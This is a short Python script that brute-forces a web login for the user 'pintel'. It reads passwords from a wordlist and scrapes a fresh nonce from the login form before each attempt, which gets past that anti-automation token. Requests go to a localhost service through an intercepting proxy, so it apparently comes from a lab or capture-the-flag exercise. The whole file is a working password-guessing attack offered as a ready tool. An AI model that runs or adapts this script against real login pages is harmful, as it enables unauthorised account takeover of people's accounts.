#!/usr/bin/python

import requests

name = 'pintel'
f = open('passwords.txt', 'r')
passwords = f.readlines()
f.close()

proxies = {'http': 'http://localhost:8080'}


for password in passwords:
    data = {'username': name}
    r = requests.post('http://localhost:9942/password', data, proxies=proxies)
    content = r.text

    nonce_locator = 'name="nonce" value="'

    start_nonce = content.find(nonce_locator) + len(nonce_locator)
    end_nonce = content.find('"', start_nonce)
    nonce = content[start_nonce:end_nonce]

    data = {'username': name, 'password': password.strip(), 'nonce': nonce}
    r = requests.post('http://localhost:9942/login', data, proxies=proxies)
    if r.text.find('wrong password') == -1:
        print ('username: %s password: %s' %(name, password))
        break
